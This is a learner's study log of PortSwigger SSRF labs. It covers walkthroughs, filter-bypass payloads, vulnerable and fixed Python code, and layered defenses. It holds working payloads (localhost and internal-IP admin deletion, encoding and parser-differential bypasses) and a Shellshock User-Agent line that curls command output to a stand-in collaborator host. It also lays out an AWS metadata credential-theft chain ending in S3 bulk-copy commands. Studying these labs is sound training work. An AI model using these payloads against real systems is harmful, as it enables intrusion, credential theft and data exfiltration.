# Day 22 — SSRF (Server-Side Request Forgery)
**Date:** May 7, 2026
**Platform:** PortSwigger Web Security Academy
**Labs Completed:** 5 Apprentice/Practitioner Labs + 2 Conceptual (Blind SSRF)
**Status:** All Solved ✅

---

## 1. What We Did Today — Overview

Today was entirely focused on SSRF — Server-Side Request Forgery. We completed 5 PortSwigger labs covering every major SSRF pattern: basic SSRF against localhost, internal network scanning via SSRF, blacklist filter bypass using alternative address representations, filter bypass via open redirection chaining, and whitelist filter bypass using URL parsing tricks. We also covered Blind SSRF conceptually — including the Shellshock chain and the AWS metadata credential theft chain that caused the Capital One breach.

---

## 2. The Foundation — Why SSRF Exists

### Root Cause

Developers build features that require the server to fetch something from a URL — a product stock check, a PDF generator, a link preview, a webhook. The developer writes code that takes a URL from the user's request and fetches it server-side.

The mistake: the developer never restricts which URLs the server is allowed to fetch. They assume the user will send a normal external URL. They never consider that the user might send an internal URL — one that points to a service only accessible from inside the server's own network.

The critical point: **the server has network access that an external attacker does not.** The server can reach internal services on `localhost`, internal IP ranges like `192.168.x.x`, and in cloud environments — the metadata endpoint at `169.254.169.254` which hands out AWS credentials to anyone who asks from within the cloud instance.

When you make the server fetch a URL you control — you are using the server as a proxy to access network resources that are invisible and unreachable to you directly. You are borrowing the server's network position.

### Real World Analogy

Imagine you are trying to access a bank's internal employee portal. It is behind a firewall — you cannot reach it from the internet. But the bank has a customer-facing tool: *"Enter any URL and we will generate a PDF preview of that page for you."*

You enter the URL of the internal employee portal — `http://internal.bank.com/employees`. The bank's server, which sits inside the firewall and can reach internal services, fetches that page and returns it to you as a PDF preview. You never accessed the internal portal directly. The bank's own server accessed it on your behalf and handed you the result. That is SSRF.

### Three Conditions for SSRF to Exist

1. The application makes server-side HTTP requests to a URL that comes from user input (parameter, form field, header, JSON body)
2. The server has no restriction on which URLs it will fetch — internal IPs, localhost, cloud metadata endpoints are all reachable
3. The response from the fetched URL is returned to the attacker (in blind SSRF — confirmed via out-of-band means)

### Authentication vs the Real Problem

SSRF is not an authentication failure. You are a legitimate authenticated user. The problem is that the server blindly executes network requests on your behalf without validating where those requests go. The server's network position is the weapon — you are just pointing it.

### What SSRF Can and Cannot Do

**Can do:**
- Access internal services not exposed to the internet (admin panels, databases, internal APIs)
- Reach cloud metadata endpoints to steal IAM credentials (AWS, GCP, Azure)
- Scan internal networks for open ports and live hosts
- Bypass firewall rules — because the request originates from inside the network
- In blind SSRF — confirm outbound requests via out-of-band channels

**Cannot do:**
- Execute code on its own — SSRF is access, not execution (unless chained with Shellshock or similar)
- Work if the server validates URLs against a strict allowlist with IP resolution
- Exfiltrate data in blind SSRF without a receiving server

### SSRF vs Open Redirect — Key Difference

| Aspect | SSRF | Open Redirect |
|--------|------|---------------|
| Who makes the request | The **server** fetches the URL | The **browser** follows the redirect |
| Where requests go | Internal network, localhost, metadata endpoints | External URLs only |
| Impact | Access to internal resources, credential theft | Phishing, referrer bypass |
| Exploited via | URL parameter the server fetches | Redirect parameter the browser follows |

SSRF is server-side. Open redirect is client-side. They look similar in the request but the mechanism and impact are completely different.

### Real World Example — Capital One Breach 2019

A misconfigured Web Application Firewall on AWS allowed an attacker to perform SSRF. The attacker made the server send a request to the AWS metadata endpoint:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
This returned the IAM role name. A second request returned temporary AWS credentials — Access Key ID, Secret Access Key, Session Token. Using those credentials the attacker accessed S3 buckets and exfiltrated **106 million customer records**. The entire breach started with one SSRF request. Bug bounty payouts for SSRF: **$3,000 to $50,000+** depending on what internal resources are reachable.

### How to Find SSRF — The Hunt

Look for any parameter that accepts a URL or hostname:
- `?url=https://example.com`
- `?path=https://example.com/image.jpg`
- `?webhook=https://example.com/callback`
- `stockApi=https://stock-service.internal/api`
- Any image import, PDF generator, link preview feature
- Webhook configuration fields
- XML with external entity references

For each one — try pointing it at:
```
http://localhost/
http://127.0.0.1/
http://169.254.169.254/
http://192.168.0.1/
```

---

## 3. Lab Walkthroughs

---

### Lab 1 — Basic SSRF Against the Local Server ✅

**Vulnerability type:** SSRF against localhost — accessing internal admin panel via server's own loopback interface

**What this lab proves:** A URL parameter the server fetches can be redirected to `localhost` — giving access to internal services that are completely invisible to external users.

**How it was solved:**

Found the Check stock feature on a product page. Intercepted the POST request in Burp — found the `stockApi` parameter containing the stock service URL. Sent the request to Burp Repeater. Changed the `stockApi` value to point at the internal admin panel and delete carlos directly:

```
http%3a//localhost/admin/delete%3fusername%3dcarlos
```

Decoded this is: `http://localhost/admin/delete?username=carlos`

The URL encoding (`%3a` = `:`, `%3f` = `?`) was applied because the request body uses URL encoding. The server decoded it, fetched `http://localhost/admin/delete?username=carlos`, and executed the delete action.

**Why it worked:**

The stock check feature was built to fetch prices from an internal stock service. The developer never restricted which URLs the server would fetch. By replacing the stock service URL with `http://localhost/admin` — we made the server send a request to itself. From the admin panel's perspective — the request came from localhost, which it trusts completely. The firewall blocks external users from reaching `/admin` directly. But the server bypassed its own firewall by making the request from inside its own loopback interface.

**The vulnerable pattern:**
```python
# Server does this:
stock_url = request.POST['stockApi']     # Takes our modified URL
response = requests.get(stock_url)       # Fetches http://localhost/admin/delete?username=carlos
return response.text                     # Admin action executed — carlos deleted
```

---

### Lab 2 — Basic SSRF Against Another Back-End System ✅

**Vulnerability type:** SSRF against internal network — scanning internal IP range to find hidden back-end admin panel

**What this lab proves:** SSRF can reach internal network hosts — not just localhost — by using the server as a proxy to scan a private IP range unreachable from the internet.

**How it was solved:**

Found the Check stock feature. Intercepted the request and sent it to Burp Intruder. Marked the last octet of the internal IP as the injection position:
```
stockApi=http://192.168.0.§1§:8080/admin
```

Set payload type to Numbers, range 1–255, step 1. Ran the attack — 255 requests scanning every IP in the `192.168.0.x` subnet.

**Identifying the valid host:**
All failed requests returned status code **500**. The valid internal host at `192.168.0.36` returned status code **200** — confirming an admin panel was running there.

**Internal IP found:** `192.168.0.36`

Then changed `stockApi` to delete carlos directly:
```
stockApi=http://192.168.0.36:8080/admin/delete?username=carlos
```

**Why it worked:**

The back-end admin panel runs on an internal IP — `192.168.0.36:8080` — that is completely unreachable from the internet. The firewall blocks all external access to the `192.168.0.x` range. But the application server sits inside that same network. By making the application server fetch URLs in that range — we used it as both a port scanner and a proxy to reach a service that was invisible externally. The 500 vs 200 status code difference revealed exactly which internal host was alive.

**Why status codes revealed the answer:**
- **500** — server tried to fetch the URL, internal host did not respond or refused, server returned an error
- **200** — server fetched the URL, internal host responded with valid content, server returned it successfully

---

### Lab 3 — SSRF With Blacklist-Based Input Filter ✅

**Vulnerability type:** SSRF filter bypass — blacklist bypass using alternative address representation and double URL encoding

**What this lab proves:** Blacklist filters that block specific strings like `127.0.0.1` and `admin` can be bypassed using alternative representations the filter did not anticipate.

**How it was solved:**

Direct attempts with `127.0.0.1` and `localhost` were blocked by the filter. Used two bypass techniques combined:

**Bypass 1 — Alternative IP representation:**
`127.1` is a shorthand that most operating systems resolve identically to `127.0.0.1`. The filter was checking for the string `127.0.0.1` and `localhost` — it was not checking for `127.1`.

**Bypass 2 — Double URL encoding of the path:**
The filter was blocking the string `admin` in the path. Double URL encoding bypasses this:
```
a  →  %61  (single URL encode)
%  →  %25  (URL encode the percent sign)
so %61  →  %2561 (double encoded)
```
The filter checks the string before decoding — sees `%2561dmin` not `admin` — lets it through. The server decodes it in two passes: `%2561` → `%61` → `a`. Result: `admin`.

**Final payload that solved the lab:**
```
stockApi=http://127.1/%25%36%31dmin/delete?username=carlos
```

Breaking this down:
- `127.1` — bypasses the IP blacklist (resolves to 127.0.0.1)
- `%25%36%31` — double URL encoded `a` (`%36%31` = `61` in hex = `a`, `%25` encodes the `%`)
- Result after server decoding: `http://127.0.0.1/admin/delete?username=carlos`

**Why it worked:**

The blacklist filter checks for specific forbidden strings. It does not understand that `127.1` resolves to the same address as `127.0.0.1`. It does not decode URL encoding before checking — so `%25%36%31dmin` passes the check but decodes to `admin` when the server processes the URL. Blacklists are fundamentally weak because there are always alternative representations the developer did not think to block.

**Bypass techniques reference:**
```
127.0.0.1  →  127.1          (shorthand — most OS resolve identically)
127.0.0.1  →  2130706433     (decimal integer representation)
127.0.0.1  →  0x7f000001     (hexadecimal representation)
127.0.0.1  →  0177.0.0.1     (octal representation)
localhost  →  LOCALHOST       (case variation)
admin      →  %61dmin         (single URL encode first character)
admin      →  %2561dmin       (double URL encode — bypasses pre-decode filter check)
```

---

### Lab 4 — SSRF With Filter Bypass via Open Redirection ✅

**Vulnerability type:** SSRF filter bypass — chaining open redirect on trusted domain to reach internal resources

**What this lab proves:** When a strict URL filter only allows trusted domains — an open redirect on one of those trusted domains can be used as a stepping stone to reach internal IPs.

**How it was solved:**

Direct SSRF to localhost was blocked — the filter only allowed the stock service domain. The lab description revealed the internal admin panel at `192.168.0.12:8080`. Found an open redirect in the product navigation — the `/product/nextProduct` endpoint accepts a `path` parameter that controls where it redirects.

Chained the open redirect with SSRF — used the trusted stock service domain as the first hop, with the `path` parameter pointing to the internal admin panel:

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

**What happened step by step:**
1. Filter checks `stockApi` — sees `/product/nextProduct` on the trusted domain — passes it through
2. Server fetches `/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
3. That endpoint redirects to `http://192.168.0.12:8080/admin/delete?username=carlos`
4. Server follows the redirect — reaches the internal admin panel
5. Carlos deleted — lab solved

**Why it worked:**

The filter was a whitelist — only the stock service domain was trusted. But trusting a domain is only safe if that domain has no open redirects. The `/product/nextProduct` endpoint had an open redirect via the `path` parameter. This made the server follow a two-hop chain: trusted domain → open redirect → internal IP. The filter only saw the first hop and approved it. The HTTP client followed all hops. This is why open redirects on trusted domains are serious vulnerabilities even when they appear low impact in isolation — they become critical when chained with SSRF filters.

---

### Lab 5 — SSRF With Whitelist-Based Input Filter ✅

**Vulnerability type:** SSRF whitelist filter bypass — URL parser differential using credential embedding and double encoding

**What this lab proves:** Even whitelist filters — the stronger defense — can be bypassed by exploiting inconsistencies between how the filter parses a URL and how the HTTP library resolves it.

**How it was solved:**

The filter only allowed `stock.weliketoshop.net`. Used URL credential syntax combined with double encoding of the `@` separator:

```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

Breaking this down:
- `localhost:80` — the actual host we want to reach
- `%2523` — double URL encoded `#`. Decodes in two passes: `%2523` → `%23` → `#`
- `@stock.weliketoshop.net` — the trusted domain in the whitelist
- The filter sees: host = `stock.weliketoshop.net` (trusted) — passes it through
- The HTTP library decodes `%2523` to `#` — making `stock.weliketoshop.net` a URL fragment, not the host
- After decoding the actual request goes to: `http://localhost:80/admin/delete?username=carlos`

**Why it worked:**

URL parsing is complex. The filter and the HTTP request library parsed the same URL differently — this is called a **parser differential**. The filter checked the hostname as `stock.weliketoshop.net` (trusted) and approved the request. The HTTP library decoded `%2523` to `#` — turning everything after `#` into a fragment (which is ignored) — and resolved the actual host as `localhost`. Two components of the same application understood the same URL string differently. The attacker exploited that gap.

**Bypass techniques reference:**
```
http://trusted-host@evil-host           → credential syntax — filter sees trusted-host as credentials
http://evil-host#trusted-host           → fragment bypass — filter sees trusted-host as path
http://evil-host%2523@trusted-host      → double encoding — decodes to # after filter check
http://trusted-host.evil-host           → subdomain bypass — filter sees trusted-host as subdomain
```

---

## 4. Vulnerable Source Code — The Pattern Behind All Labs

**Vulnerable — no URL restriction:**
```python
def check_stock(request):
    stock_url = request.POST['stockApi']     # User controls this completely
    response = requests.get(stock_url)       # Server fetches whatever URL you send
    return response.text                     # Returns the result — including internal content
```

**Why this is wrong:**
Takes a URL from user input and passes it directly to an HTTP client. The server will fetch anything — localhost, internal IPs, cloud metadata endpoints. No validation. No restriction.

**Blacklist fix attempt — weak, do not use:**
```python
def check_stock(request):
    stock_url = request.POST['stockApi']
    if '127.0.0.1' in stock_url or 'localhost' in stock_url:
        return HttpResponse(403)
    response = requests.get(stock_url)
    return response.text
```
**Why this fails:** Does not block `127.1`, `2130706433`, `0x7f000001`, `192.168.x.x`, or `169.254.169.254`. Bypassed with double URL encoding. Bypassed with alternative representations. Demonstrated in Lab 3 tonight.

**Whitelist fix — correct approach:**
```python
import urllib.parse
import socket

ALLOWED_HOSTS = ['stock.weliketoshop.net']
INTERNAL_RANGES = ['127.', '192.168.', '10.', '172.16.', '169.254.']

def check_stock(request):
    stock_url = request.POST['stockApi']
    parsed = urllib.parse.urlparse(stock_url)

    # Step 1 — hostname must be in allowlist
    if parsed.hostname not in ALLOWED_HOSTS:
        return HttpResponse(403)

    # Step 2 — resolve hostname to IP and validate it is not internal
    try:
        ip = socket.gethostbyname(parsed.hostname)
    except socket.gaierror:
        return HttpResponse(403)

    for internal in INTERNAL_RANGES:
        if ip.startswith(internal):
            return HttpResponse(403)

    response = requests.get(stock_url)
    return response.text
```

**Why this is better:** Parses URL properly, checks hostname against allowlist, resolves to IP and validates the IP is not in any internal range. Much harder to bypass.

**The truly correct fix:** Remove user-controlled URLs entirely. The server should call a hardcoded internal stock service URL. Never let user input touch the URL the server fetches. If dynamic URLs are required — use a strict allowlist of complete URLs, not just hostnames.

---

## 5. Blind SSRF — Conceptual Understanding

### What is Blind SSRF?

In all 5 labs tonight — the server fetched the URL and returned the response to us. We could read the admin panel HTML in Burp. That is **non-blind SSRF**.

**Blind SSRF** is when:
- The server still makes the request to the URL we supply
- But it does NOT return the response to us
- We get the same application response regardless of what the server fetched internally

We cannot see what the server retrieved. But we can confirm the server made the request using an **out-of-band channel**.

### How Blind SSRF Is Confirmed — Burp Collaborator (Pro)

Burp Collaborator spins up a server at a unique domain:
```
abc123.burpcollaborator.net
```
We inject this domain into the SSRF parameter:
```
stockApi=http://abc123.burpcollaborator.net
```
The application server makes a DNS lookup and HTTP request to `abc123.burpcollaborator.net`. Burp Collaborator receives that interaction and reports back to Burp Pro: *"Someone connected to your Collaborator domain from IP X.X.X.X."* We never see the response — but we now know the server makes outbound requests to URLs we control. That confirmation is the vulnerability.

### Free Alternative — interactsh

Since Burp Collaborator requires Pro — use interactsh on Kali:
```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Run — generates a unique callback domain
interactsh-client
# Output: abc123.interactsh.com

# Inject in SSRF parameter:
stockApi=http://abc123.interactsh.com
# Any connection from the target server shows in your terminal
```

Or use the web version at `https://app.interactsh.com` — no installation needed.

### Why Blind SSRF Still Matters

Even without seeing responses — blind SSRF can:
- Confirm SSRF exists — the out-of-band request proves it
- Map internal network — which internal IPs respond vs timeout
- Chain with Shellshock for Remote Code Execution on internal servers
- Trigger internal actions (webhooks, state changes) without needing to read the response

### Shellshock + Blind SSRF Chain (Lab 7 Concept)

Shellshock (CVE-2014-6271) is a vulnerability in old Bash versions. If an internal server runs a CGI script that passes HTTP headers to Bash — injecting a Shellshock payload in the `User-Agent` header executes commands on that server.

Combined with blind SSRF:
```
Step 1: Find blind SSRF parameter
        stockApi=http://192.168.0.X:8080/cgi-bin/script

Step 2: Add Shellshock payload in User-Agent header:
        User-Agent: () { :; }; /usr/bin/curl http://your-collaborator.com/$(whoami)

Step 3: The internal server's Bash processes the CGI request
        Executes: curl http://your-collaborator.com/root
        (or whatever user the server runs as)

Step 4: Your Collaborator/interactsh receives:
        GET /root HTTP/1.1  — confirming command execution

Step 5: Blind SSRF upgraded to Remote Code Execution on internal server
```

Severity upgrade: High SSRF + Old internal server = Critical RCE on internal infrastructure.

---

## 6. Chain Thinking — SSRF to Full Cloud Account Compromise

```
Today's vulnerability: SSRF (user-controlled URL the server fetches)
        ↓
Combines with: AWS Cloud Metadata Endpoint (169.254.169.254)
        ↓
Combined impact: IAM credential theft → full cloud account compromise
        ↓
Severity upgrade: High SSRF + Cloud environment = Critical infrastructure takeover
```

**The full attack chain:**
```
Step 1: Find SSRF parameter in any feature
        stockApi=http://169.254.169.254/latest/meta-data/

Step 2: Server fetches metadata endpoint — response lists available paths:
        iam/
        hostname
        instance-id

Step 3: Fetch IAM role name
        stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/
        Response: ec2-prod-role

Step 4: Fetch credentials for that role
        stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role
        Response:
        {
          "AccessKeyId": "ASIA...",
          "SecretAccessKey": "abc123...",
          "Token": "FQoGZXIvYXdz...",
          "Expiration": "2026-05-10T06:00:00Z"
        }

Step 5: Use credentials with AWS CLI on attacker machine
        export AWS_ACCESS_KEY_ID=ASIA...
        export AWS_SECRET_ACCESS_KEY=abc123...
        export AWS_SESSION_TOKEN=FQoGZXIvYXdz...

        aws s3 ls                                          → lists all S3 buckets
        aws s3 cp s3://company-private-bucket/ . --recursive → downloads all private data
        aws iam list-users                                 → lists all IAM users
        aws ec2 describe-instances                         → maps entire infrastructure

Step 6: Full cloud compromise
        All S3 data exfiltrated
        New IAM admin users created for persistence
        Potential pivot to other AWS accounts via trust relationships
```

**Real world impact:** This is exactly the Capital One breach — 2019. One SSRF parameter. 106 million customer records. The metadata endpoint is reachable from every AWS EC2 instance. It requires no authentication. It hands out real credentials to anyone who asks from inside the instance — and SSRF makes you "inside the instance" from the server's perspective.

---

## 7. Real World Context

| Vulnerability | Real World Impact | Payout Range |
|---------------|------------------|--------------|
| Basic SSRF → localhost admin | Full application admin access | $1,000 – $5,000 |
| SSRF → internal network scan | Map and access internal infrastructure | $2,000 – $8,000 |
| SSRF → AWS metadata | IAM credential theft, cloud compromise | $10,000 – $50,000+ |
| Blind SSRF confirmed OOB | Proof of SSRF, basis for further chaining | $500 – $3,000 |
| Blind SSRF + Shellshock | RCE on internal server | $15,000 – $50,000+ |

SSRF in cloud environments is almost always rated Critical. A single SSRF finding in an AWS application is one of the highest-value bugs in modern bug bounty.

---

## 8. The Fix — Defense in Depth

**Layer 1 — Remove user-controlled URLs (best):**
Do not let user input touch the URL the server fetches. Hardcode the internal service URL server-side.

**Layer 2 — Strict allowlist with IP resolution (if dynamic URLs required):**
Allowlist exact trusted hostnames. After resolving to IP — validate the IP is not in any internal range. Block `127.x.x.x`, `192.168.x.x`, `10.x.x.x`, `172.16-31.x.x`, `169.254.x.x`.

**Layer 3 — Never follow redirects:**
Disable automatic redirect following in the HTTP client. If redirects are needed — validate the redirect destination against the same rules.

**Layer 4 — Bind internal services to localhost only:**
Internal admin panels should only listen on `127.0.0.1` — not `0.0.0.0`. Reduces SSRF blast radius.

**Layer 5 — Use IMDSv2 on AWS:**
AWS Instance Metadata Service v2 requires a session token obtained via a PUT request before serving credentials. This breaks the simple GET-based SSRF chain against `169.254.169.254`. All new AWS instances should enforce IMDSv2.

---

## 9. Key Concepts Summary

| Concept | Definition |
|---------|-----------|
| SSRF | Server-Side Request Forgery — making the server fetch a URL you control |
| Blind SSRF | SSRF where the response is not returned — confirmed via out-of-band channel |
| 169.254.169.254 | AWS/cloud metadata endpoint — returns IAM credentials to any internal request |
| Link-local address | IP range only reachable from within the machine or local network — not internet-routable |
| Blacklist bypass | Using alternative representations of blocked values (127.1, decimal IP, URL encoding) |
| Whitelist bypass | Parser differential — filter and HTTP client parse the same URL differently |
| Parser differential | Two components interpret the same input differently — exploited to bypass security checks |
| Open redirect chain | Trusted domain with open redirect used as stepping stone to reach internal IPs |
| Burp Collaborator | Out-of-band server that detects blind SSRF via DNS/HTTP callbacks (Pro only) |
| interactsh | Free open-source alternative to Burp Collaborator for OOB detection |
| IMDSv2 | AWS metadata service v2 — requires session token, blocks simple SSRF against metadata |

---

## 10. Payloads and Commands Reference

**Basic SSRF — localhost:**
```
stockApi=http://localhost/admin
stockApi=http://127.0.0.1/admin
stockApi=http%3a//localhost/admin/delete%3fusername%3dcarlos
```

**Internal network scan (Burp Intruder):**
```
stockApi=http://192.168.0.§1§:8080/admin
Payload: Numbers 1–255
Identify valid host: status 200 vs 500
```

**Blacklist bypass techniques:**
```
http://127.1/admin                          → shorthand IP
http://2130706433/admin                     → decimal IP
http://0x7f000001/admin                     → hex IP
http://127.1/%2561dmin                      → single URL encoded 'a'
http://127.1/%25%36%31dmin                  → double URL encoded 'a'
```

**Open redirect chain:**
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

**Whitelist bypass — double encoding:**
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

**AWS metadata chain:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
```

**interactsh — blind SSRF detection:**
```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
# Use generated domain in stockApi parameter
```

---

## 11. Foundation Checklist

Answer these from memory — not from these notes:

1. **What causes SSRF?** What specific developer assumption creates the vulnerability?
2. **Why is SSRF in a cloud environment almost always Critical severity?** What makes `169.254.169.254` dangerous?
3. **What is the difference between SSRF and open redirect?** Who makes the request in each case?
4. **Why do blacklist filters fail against SSRF?** Give two bypass techniques from tonight.
5. **What is blind SSRF and how do you confirm it** without seeing the server's response?
6. **How does SSRF chain with open redirect?** Walk through the two-hop mechanism step by step.

---
